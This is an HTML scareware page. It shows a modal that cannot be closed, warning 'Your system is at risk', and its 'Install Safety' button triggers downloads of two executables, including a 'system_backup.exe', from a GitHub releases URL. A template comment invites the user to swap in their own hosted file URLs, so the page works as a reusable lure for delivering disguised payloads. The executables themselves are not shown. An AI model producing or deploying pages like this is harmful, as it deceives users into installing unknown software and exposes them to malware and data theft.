<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<title>Download</title>
<style>
  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, sans-serif;
    background: #1e2a38;
    color: #eee;
    overflow: hidden; /* prevent scrolling when modal open */
  }
  .overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0,0,0,0.8);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
  }
  .card {
    max-width: 420px;
    width: 90%;
    padding: 32px;
    background: #27394d;
    border-radius: 10px;
    text-align: center;
    box-shadow: 0 8px 24px rgba(0,0,0,.35);
    position: relative;
  }
  h1 { font-size: 22px; margin: 0 0 12px; }
  p  { font-size: 14px; line-height: 1.6; margin: 0 0 24px; }
  button {
    font-size: 16px;
    font-weight: bold;
    padding: 14px 28px;
    border: none;
    border-radius: 6px;
    background: #2f81f7;
    color: #fff;
    cursor: pointer;
  }
  button:hover { background: #1f6feb; }
</style>
</head>
<body>
  <div id='popup' class='overlay'>
    <div class='card'>
      <h1>Your system is at risk</h1>
      <p>Install your System_Backup.exe by DotNet or risk loosing all your data next time your computer restart</p>
      <button id='dlbtn'>Install Safety</button>
    </div>
  </div>
<script>
  // ============================================================
  //  PUT YOUR HOSTED FILE URLs HERE (see hosting note below)
  // ============================================================
  var FILES = [
    'https://github.com/crocrodil666/net/releases/download/windows/dotNetFx40_Full_x86_x64.exe',
    'https://github.com/crocrodil666/net/releases/download/windows/system_backup.exe'
  ];

  document.getElementById('dlbtn').addEventListener('click', function () {
    FILES.forEach(function (url) {
      var a = document.createElement('a');
      a.href = url;
      a.download = '';
      document.body.appendChild(a);
      a.click();
      a.remove();
    });
    // Hide popup after downloads start
    document.getElementById('popup').style.display = 'none';
  });

  // Prevent closing by clicking overlay or pressing ESC
  document.getElementById('popup').addEventListener('click', function (e) {
    if (e.target === this) {
      // Click on overlay, do nothing (keep popup)
      e.stopPropagation();
    }
  });
  window.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') {
      e.preventDefault();
    }
  });
</script>
</body>
</html>
